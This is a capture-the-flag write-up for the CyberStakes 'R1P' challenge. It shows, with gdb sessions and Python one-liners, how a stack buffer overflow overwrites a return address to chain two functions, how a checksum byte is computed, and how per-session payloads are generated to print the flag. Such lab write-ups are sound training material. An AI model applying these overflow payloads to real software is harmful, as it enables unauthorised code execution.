## R1P [150]

## Solution
`scp` the binary from the server for local analysis without time constraints (server will kill your SSH session after 15 minutes). Note that the flag file `flag` must be more than `0x35` (53) characters or it will fail the `check_flag()` function:
```
ameise@STAHLKERN:~/CS2015/pwn/150_R1P$ scp -P 58476 captain@shell.cyberstakesonline.com:/bomb/r1p r1p  
ameise@STAHLKERN:~/CS2015/pwn/150_R1P$ ls
r1p
ameise@STAHLKERN:~/CS2015/pwn/150_R1P$ echo -n this_is_the_flag > flag
ameise@STAHLKERN:~/CS2015/pwn/150_R1P$ ./r1p 
Key is too short
ameise@STAHLKERN:~/CS2015/pwn/150_R1P$ python -c 'print "flag: " + "z"*55' > flag
ameise@STAHLKERN:~/CS2015/pwn/150_R1P$ ./r1p 
Enter launch code: 
aaaaa
INVALID LAUNCH CODE
```

Now we can use IDA pro and `gdb` to examine the binary without time constraints. This will also not work well on the CyberStakes server because it will fail to open `./flag` if you run `r1p` within `gdb` (incorrect permissions). The function `validate_code()` ensures that the sum of all of the key bytes is `0x00` with a start at `0x2b`. This can be decompiled to the following C code:
```C
void validate_code(char* buffer) {
  
  char c = 0x2b;
  
  i = 0;
  while(buffer[i]) {
    
    c += buffer[i];
    i++;
  }
  
  if (c) die();
}
```

We can solve this in the exact same way as [R0P](../130_R0P) by overwriting the return address of `vulnerable_function()` with the address of `call_first()` and the address of `call_second()` directly afterward. First we need to figure out the distance between the top of the buffer and the return address on `vulnerable_function()`'s stack:
```
ameise@STAHLKERN:~/CS2015/pwn/150_R1P$ gdb ./r1p 
Reading symbols from ./r1p...(no debugging symbols found)...done.
(gdb) disas main
Dump of assembler code for function main:
   0x0804890b <+0>:	    lea    ecx,[esp+0x4]
   0x0804890f <+4>:	    and    esp,0xfffffff0
   0x08048912 <+7>:	    push   DWORD PTR [ecx-0x4]
   0x08048915 <+10>:	push   ebp
   0x08048916 <+11>:	mov    ebp,esp
   0x08048918 <+13>:	push   ecx
   0x08048919 <+14>:	sub    esp,0x4
   0x0804891c <+17>:	call   0x8048728 <check_flag>
   0x08048921 <+22>:	call   0x8048863 <vulnerable_function>
   0x08048926 <+27>:	sub    esp,0x4
   0x08048929 <+30>:	push   0xd
   0x0804892b <+32>:	push   0x8048a7c
   0x08048930 <+37>:	push   0x1
   0x08048932 <+39>:	call   0x80484a0 <write@plt>
   0x08048937 <+44>:	add    esp,0x10
   0x0804893a <+47>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x0804893d <+50>:	leave  
   0x0804893e <+51>:	lea    esp,[ecx-0x4]
   0x08048941 <+54>:	ret    
End of assembler dump.
```

The return address pushed onto the stack during the call to `vulnerable_function()` will be `0x08048926`. Now we can set breakpoints in `vulnerable_function()` to find the addresses of the return address and `buffer[]` on the stack:
```
(gdb) disas vulnerable_function 
Dump of assembler code for function vulnerable_function:
   0x08048863 <+0>:	    push   ebp
   0x08048864 <+1>:	    mov    ebp,esp
   0x08048866 <+3>:	    sub    esp,0x48
   [...]
   0x080488fa <+151>:	sub    esp,0xc
   0x080488fd <+154>:	lea    eax,[ebp-0x38]
   0x08048900 <+157>:	push   eax
   0x08048901 <+158>:	call   0x80487dc <validate_code>
   0x08048906 <+163>:	add    esp,0x10
   0x08048909 <+166>:	leave  
   0x0804890a <+167>:	ret    
End of assembler dump.
(gdb) break *0x08048863
Breakpoint 1 at 0x8048863
(gdb) break *0x08048901
Breakpoint 2 at 0x8048901
(gdb) run
Starting program: /home/ameise/CS2015/pwn/150_R1P/r1p 

Breakpoint 1, 0x08048863 in vulnerable_function ()
(gdb) x/1xw $esp
0xffffceec:	0x08048926
(gdb) c
Continuing.
Enter launch code: 
aaaabbbbccccdddd

Breakpoint 2, 0x08048901 in vulnerable_function ()
(gdb) p/x $eax
$1 = 0xffffceb0
(gdb) x/s 0xffffceb0
0xffffceb0:	"aaaabbbbccccdddd"
```

The return address is at `0xffffceec` and the buffer start is at `0xffffceb0`. Therefore, we must pad `0x3c` (60) bytes before overwriting the return address with the addresses of `call_first()` and `call_second()`:
```
python -c 'print "a"*60 + "\x78\x86\x04\x08" + "\xbb\x85\x04\x08"'
```

However, the sum of the entire payload needs to be `0x00` with a starting value of `0x2b`. We can do this in Python:
```
ameise@STAHLKERN:~/CS2015/pwn/150_R1P$ python
Python 2.7.12 (default, Jul  1 2016, 15:12:24) 
[GCC 5.4.0 20160609] on linux2
>>> payload = "a"*60 + "\x78\x86\x04\x08" + "\xbb\x85\x04\x08"
>>> sum = 0
>>> for c in payload:
...   sum += ord(c)
... 
>>> 256 - (sum % 256)
238
>>> 256 - ((0x2b + sum) % 256)
195
>>> chr(195)
'\xc3'
```

Now we have our full payload, which will work on our local copy:
```
ameise@STAHLKERN:~/CS2015/pwn/150_R1P$ python -c 'print "a"*60 + "\x78\x86\x04\x08" + "\xbb\x85\x04\x08" + "\xc3"' | ./r1p 
Enter launch code: 
Launch code accepted, processing...
Loading first half of key...
Your key is: flag: zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
Segmentation fault (core dumped)
```

However, the server binary changes every time you log into a new SSH session. The two things that change are the size of `buffer[]` in `vulnerable_function()` and the start byte in `validate_code()`. We can use our knowledge of the distance between the start of `buffer[]` and the target return address in our *local copy* to make a Python script that allows us to calculate the new payload on-the-fly (in the local copy, the function prologue of `vulnerable_function()` subtracted `0x48` bytes from the stack pointer `esp`, yielding a distance of 60 bytes between the start of `buffer[]` and the return address on `vulnerable_function()`'s stack:
```Python
# local test case data
test_distance = 60 # distance between buffer[] and return address
test_bufferstart = 0x48 # [ebp-0x38]

# constants
addr_call_first = "\x78\x86\x04\x08"
addr_call_second = "\xbb\x85\x04\x08"

# live session
BUFFERSTART = ???
STARTBYTE = ???

distance = 60 - (test_bufferstart - BUFFERSTART)

payload = ""
payload += "a"*distance
payload += addr_call_first
payload += addr_call_second

s = STARTBYTE
for c in payload:
  s += ord(c)

print "Padding: " + str(distance)
print "End Byte: " + hex(ord(chr(256 - (s % 256))))
```

Logging into an actual SSH session on the CyberStakes server, we open the binary up in `gdb` to see what the new values are:
```
(gdb) disas vulnerable_function 
Dump of assembler code for function vulnerable_function:
   0x08048863 <+0>:	    push   ebp
   0x08048864 <+1>:	    mov    ebp,esp
   0x08048866 <+3>:	    sub    esp,0x68                         <new stack pointer subtraction 0x68 (compared to 0x48 in local copy)
   0x08048869 <+6>:	    mov    DWORD PTR ds:0x804a068,0x0
   0x08048873 <+16>:	sub    esp,0xc
   0x08048876 <+19>:	push   0x8048a68
   [...]
End of assembler dump.
(gdb) disas validate_code 
Dump of assembler code for function validate_code:
   0x080487dc <+0>:	    push   ebp
   0x080487dd <+1>:	    mov    ebp,esp
   0x080487df <+3>:	    sub    esp,0x18
   0x080487e2 <+6>:	    mov    BYTE PTR [ebp-0x9],0x64          <=== new checksum offset 0x64 (compared to 0x2b in local copy)
   0x080487e6 <+10>:	mov    DWORD PTR ds:0x804a068,0x0
   0x080487f0 <+20>:	jmp    0x8048815 <validate_code+57>
   [...]
End of assembler dump.
(gdb) quit
```

Replacing the values `BUFFERSTART` and `STARTBYTE` in [calc.py](calc.py) gives us:
```
ameise@STAHLKERN:~/CS2015/pwn/150_R1P$ python calc.py 
Padding: 92
End Byte: 0x6a
```

Now we have our correctly formatted payload for the binary in this particular SSH session:
```
captain@5a093799d1c8[00:10:59]:/bomb$ python -c 'print "a"*92 + "\x78\x86\x04\x08" + "\xbb\x85\x04\x08" + "\x6a"' | ./r1p
Enter launch code: 
Launch code accepted, processing...
Loading first half of key...
Your key is: all_your_base_pointer_6696186e870135295f95dfab8e4318bb
zsh: done                python -c 'print "a"*92 + "\x78\x86\x04\x08" + "\xbb\x85\x04\x08" + "\x6a"' | 
zsh: segmentation fault  ./r1p
```